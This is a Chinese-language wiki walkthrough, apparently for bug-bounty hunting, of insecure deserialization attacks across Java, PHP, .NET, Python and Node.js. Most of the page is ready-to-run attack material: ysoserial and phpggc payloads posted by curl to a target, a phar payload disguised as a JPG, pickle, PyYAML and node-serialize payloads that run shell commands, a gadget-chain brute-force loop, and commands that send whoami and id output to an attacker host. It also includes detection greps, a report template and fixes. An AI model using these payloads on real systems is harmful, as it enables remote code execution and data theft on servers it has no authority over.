---
type: wiki
category: attack
tool: ysoserial,phpggc,manual
status: active
last-updated: 2026-04-21
---

# Insecure Deserialization 攻擊 Walkthrough（2026 版）

> **用途：** 反序列化是經典 P1（RCE）。雖然現代框架逐步移除危險 sink，但老版本 Java（Apache Commons Collections / T3 / Spring AMQP）、PHP phar、.NET BinaryFormatter、Python pickle、Node.js node-serialize 仍然是最容易拿 RCE 的攻擊面之一。

## 0. 原理

Server 收到使用者提供的**序列化後的 byte 串**（cookie、header、body、URL param、檔案上傳），呼叫 deserialize 函式重建物件。若物件類別有 magic method（`__wakeup`、`readObject`、`finalize`、`ObjectInputStream.resolveClass`）→ 任意程式碼被執行。

**識別序列化格式**：

| 格式 | 開頭 特徵 | 語言 |
|------|-----------|------|
| `aced0005` | hex | Java `ObjectOutputStream` |
| `H4sIAAAA` (gzip+base64) | base64 | 常見 Java 傳輸 |
| `O:N:"ClassName"` | 字串 | PHP `serialize()` |
| `{"$type":...}` | JSON | .NET `Json.NET TypeNameHandling` |
| `\x80\x04` 或 `\x80\x03` | binary | Python pickle |
| `_$$ND$$_` 開頭 | base64 | Node.js `node-serialize` |
| YAML `!!python/object` | text | PyYAML `yaml.load` |

## 1. 偵測 cheatsheet

### 1.1 Body / cookie / header 看關鍵字

```bash
# Burp decoder 或 CyberChef
# 找到 base64 / hex / query string，decode 看前幾 byte
```

### 1.2 Error-based

```
aced0005 payload → 500 + "ClassNotFoundException"
O:8:"stdClass" → "unserialize(): Error at offset"
```

錯誤訊息洩漏 = 你找到 deserialize sink。

### 1.3 Sleep gadget（盲測）

```
Java (CC gadget): ysoserial CommonsCollections5 "sleep 10"
# 若 response ~10sec → 有 CC 在 classpath
```

## 2. Java 反序列化

### 2.1 ysoserial 快速用法

```bash
# 安裝（有預編 jar）
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# 列出 gadget chain
java -jar ysoserial-all.jar

# 產 payload（命令執行）
java -jar ysoserial-all.jar CommonsCollections5 "curl http://attacker/$(whoami)" > payload.bin

# 送進 target
curl -X POST https://target.com/api/import \
  --data-binary @payload.bin \
  -H "Content-Type: application/x-java-serialized-object"
```

**常用 gadget chain 對照**：

| Chain | 依賴 | 何時用 |
|-------|------|--------|
| `CommonsCollections1-7` | Apache Commons Collections | 最常見，優先試 |
| `CommonsBeanutils1` | Apache Commons BeanUtils | Shiro 常見 |
| `Spring1/2` | Spring Framework | Spring app |
| `Hibernate1/2` | Hibernate | JPA app |
| `Jdk7u21` | JDK 7 only | legacy |
| `URLDNS` | 無依賴，純 DNS callback | **首選偵測**（不需 RCE，只要 DNS 外連）|

### 2.2 URLDNS 偵測

```bash
java -jar ysoserial-all.jar URLDNS "http://c23abc.oast.live" > payload.bin

curl -X POST https://target.com/api/session \
  --data-binary @payload.bin

# 回 interactsh 看 DNS → 確認 deserialization 觸發
```

**重要**：URLDNS 不需要任何 gadget 依賴，單純用 `java.net.URL.hashCode()` 觸發 DNS 解析 → 最穩定的盲測。

### 2.3 Spring Framework Deserialization

Spring RCE 主要 CVE：

| CVE | 影響 | 特徵 |
|-----|------|------|
| CVE-2016-1000027 | Spring AMQP | HttpInvoker，`/invoker` endpoint |
| CVE-2017-8046 | Spring Data REST | PATCH 用 SpEL |
| CVE-2022-22965 (Spring4Shell) | Spring Core | `class.module.classLoader.resources.context.parent.pipeline.first.pattern=` |

```bash
# Spring4Shell 偵測
curl "https://target.com/?class.module.classLoader.URLs%5B0%5D=0"
# 若 400 Bad Request（內部錯誤訊息）→ 版本可能受影響
```

### 2.4 Apache Shiro deserialization (CVE-2016-4437)

特徵：cookie 有 `rememberMe=`。

```bash
# 工具
git clone https://github.com/feihong-cs/ShiroExploit-Deprecated
# 或 ShiroAttack2 GUI

# 偵測 key + gadget
python3 shiro.py -u https://target.com
# 自動試 10+ 常見 AES key + 10+ gadget chain
```

預設 key `kPH+bIxk5D2deZiIxcaaaA==` 是最常見洩漏 key。

### 2.5 WebLogic T3 / IIOP（不常遇到但爆頭）

```bash
pip install weblogic-tools
weblogic-tools --target https://target.com:7001 --check

# 或直接用 Nuclei
nuclei -u https://target.com:7001 -tags weblogic,rce
```

## 3. PHP 反序列化

### 3.1 PHP serialize() 基本

```php
// 有漏洞的 sink
$obj = unserialize($_COOKIE['data']);

// 攻擊者送 O:8:"ClassName":1:{s:3:"cmd";s:2:"id";}
// 若 __wakeup / __destruct 呼叫 exec($this->cmd) → RCE
```

### 3.2 phpggc（PHP gadget chain generator）

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc

# 列出所有 chain
./phpggc -l

# 常見：
# Laravel/RCE1, Laravel/RCE9 (5.4-9.x)
# Symfony/FW1, Symfony/RCE5
# Drupal/FW1
# SwiftMailer/FW1
# Yii/RCE2
# WordPress/RCE1

# 產生 payload
./phpggc Laravel/RCE9 system "id" -b
# -b = base64

# 送到 target
curl -b "PHPSESSID=$(./phpggc Laravel/RCE9 system 'id' -b)" https://target.com/
```

### 3.3 Phar deserialization（檔案操作 → RCE）

```php
// 漏洞 sink：file_exists/file_get_contents/filemtime 等任何 filesystem 函式
// 若 path 開頭 phar:// → PHP 自動 unserialize phar 的 metadata

file_exists($_GET['file']);
// $_GET[file] = phar://uploaded.jpg/x → trigger deserialize
```

**產生 phar payload**：

```bash
./phpggc Monolog/RCE1 system "id" -pf  # -p phar, -f fake JPG
# 會產 phar.phar，file type 偽造為 JPG

# 上傳（大多 upload endpoint 接受 JPG）
curl -F "file=@phar.phar;filename=x.jpg" https://target.com/upload

# 觸發（任何對 uploaded 檔的 filesystem op）
curl "https://target.com/view?file=phar:///var/www/uploads/x.jpg"
```

### 3.4 PHP POP chain 手動構造

找 `__wakeup` / `__destruct` / `__toString` / `__call` 使用 attacker-controlled property 的 class。

```bash
# semgrep
semgrep --config=p/php --include='*.php' .
# 或 phpstan / snyk code / sonarqube
```

手動審 Composer vendored library 也能找到 0day chain。

## 4. .NET 反序列化

### 4.1 BinaryFormatter（最危險）

```csharp
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // VULN
```

.NET 5+ 已 deprecated 但 legacy codebase 還在用。

### 4.2 Json.NET TypeNameHandling=All

```json
{
  "$type": "System.IO.FileInfo, System.IO.FileSystem",
  "fileName": "C:\\Windows\\Temp\\x.txt"
}
```

當 `TypeNameHandling = TypeNameHandling.All` 時可任意指定 type → 經 gadget → RCE。

### 4.3 ysoserial.net

```bash
# Windows 上：
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc"

# 支援 formatter：
# BinaryFormatter / NetDataContractSerializer /
# SoapFormatter / ObjectStateFormatter /
# Json.Net / LosFormatter / DataContractSerializer /
# XmlSerializer
```

### 4.4 ViewState deserialization (ASP.NET)

```
__VIEWSTATE=<base64>
```

若 machineKey 洩漏（web.config） → 可構造惡意 ViewState 達成 RCE。

```bash
ysoserial.net -p ViewState -g TextFormattingRunProperties \
  -c "calc" --path="/default.aspx" \
  --apppath="/" --decryptionalg="AES" --decryptionkey="..." \
  --validationalg="SHA1" --validationkey="..."
```

## 5. Python 反序列化

### 5.1 pickle（危險本質）

```python
# 漏洞 sink
pickle.loads(request.cookies['data'])

# Payload
import pickle, os, base64
class E:
  def __reduce__(self):
    return (os.system, ('curl attacker/$(whoami)',))

print(base64.b64encode(pickle.dumps(E())))
```

### 5.2 yaml.load（PyYAML < 5.1）

```yaml
!!python/object/apply:os.system ["curl attacker/x"]
```

PyYAML 5.1+ 預設改 `safe_load`，但老 app 仍用 `yaml.load(data)`。

### 5.3 jsonpickle / dill / shelve

這些都跟 pickle 一樣不安全。

## 6. Node.js 反序列化

### 6.1 node-serialize IIFE injection

```js
// VULN
const serialize = require('node-serialize');
serialize.unserialize(userInput);  // _$$ND_FUNC$$_ wrapper 會 eval
```

payload：

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker/$(id)',()=>{})}()"}
```

### 6.2 funcster / serialize-javascript

較少用但同樣危險。

### 6.3 ejs / pug / jade template 注入（嚴格來說是 SSTI，但常藉反序列化觸發）

見 [18-payload-cheatsheet.md](18-payload-cheatsheet.md) SSTI section。

## 7. 常見 sink & 搜尋

### 7.1 Java

```bash
grep -r 'ObjectInputStream\|readObject\|readUnshared\|SerializationUtils.deserialize\|XStream\|XMLDecoder\|SnakeYAML\|Jackson.*enableDefaultTyping' src/
```

### 7.2 PHP

```bash
grep -r 'unserialize\|file_exists\|file_get_contents\|filemtime\|is_file' src/
# phar 可繞進任何 filesystem 函式
```

### 7.3 .NET

```bash
grep -r 'BinaryFormatter\|NetDataContractSerializer\|ObjectStateFormatter\|SoapFormatter\|LosFormatter\|TypeNameHandling' src/
```

### 7.4 Python

```bash
grep -r 'pickle\.loads\|cPickle\.loads\|yaml\.load(' src/
```

### 7.5 Node.js

```bash
grep -r 'node-serialize\|funcster\|serialize-javascript\|vm\.runIn\|eval(' src/
```

## 8. 完整 PoC：Java Commons Collections → RCE

### Step 1: 確認序列化格式

```bash
# Cookie session_data 是 base64，decode 看
echo 'rO0ABXNyABxj...' | base64 -d | xxd | head -2
# 00000000: aced 0005  → Java serialization
```

### Step 2: URLDNS 盲測

```bash
java -jar ysoserial-all.jar URLDNS "http://c23abc.oast.live" | base64 > payload.txt

curl -b "session_data=$(cat payload.txt)" https://target.com/app/home

# 等 interactsh callback → confirmed
```

### Step 3: 試 gadget chain

```bash
for chain in CommonsCollections{1,2,3,4,5,6,7} CommonsBeanutils1 Spring1 Hibernate1; do
  java -jar ysoserial-all.jar $chain "curl http://c23abc.oast.live/$chain" | base64 > /tmp/p_$chain
  curl -b "session_data=$(cat /tmp/p_$chain)" https://target.com/app/home > /dev/null
done

# interactsh 看哪個 chain 回 callback → 該 chain 可用
```

### Step 4: 取 shell（POC 止於 curl whoami）

```bash
java -jar ysoserial-all.jar CommonsCollections5 "curl http://attacker/$(id | base64)" | base64 > exploit.txt
curl -b "session_data=$(cat exploit.txt)" https://target.com/app/home
```

**重要**：PoC 停在 `curl attacker/$(whoami)`。不要 reverse shell，不要 persist。

## 9. 報告 template

```markdown
## 漏洞概述
https://target.com/app/home 的 session_data cookie 被 server 以
Java ObjectInputStream 反序列化，classpath 上有 Apache Commons Collections 3.x
導致可透過 ysoserial CommonsCollections5 gadget 達成 pre-auth RCE。

## 重現步驟

### Step 1: 確認 cookie 格式
[aced0005 magic bytes]

### Step 2: URLDNS 盲測
[java -jar ysoserial URLDNS + DNS callback 截圖]

### Step 3: CC5 chain confirm
[curl PoC + attacker logs whoami output]

## Impact
- Pre-auth remote code execution on application server
- Server runs as user `tomcat` (uid confirmed via PoC)
- Potential pivot to internal network / data exfiltration

## Severity
P1 / Critical

## 修補建議
1. 若必須 deserialize，使用白單（`ObjectInputFilter` in JDK 9+ / SerialKiller）
2. 升級 Apache Commons Collections 到 4.x（已移除 InvokerTransformer）
3. 改用 JSON（Jackson with no TypeNameHandling）代替 native 反序列化
4. 將 session 改用 server-side storage + opaque token
```

## 關聯文件

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSTI section
- [66-ssrf-deep.md](66-ssrf-deep.md) — SSRF → jar:// 觸發
- ysoserial：https://github.com/frohoff/ysoserial
- phpggc：https://github.com/ambionics/phpggc
- ysoserial.net：https://github.com/pwntester/ysoserial.net
- PortSwigger Insecure Deserialization：https://portswigger.net/web-security/deserialization
- PayloadsAllTheThings：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
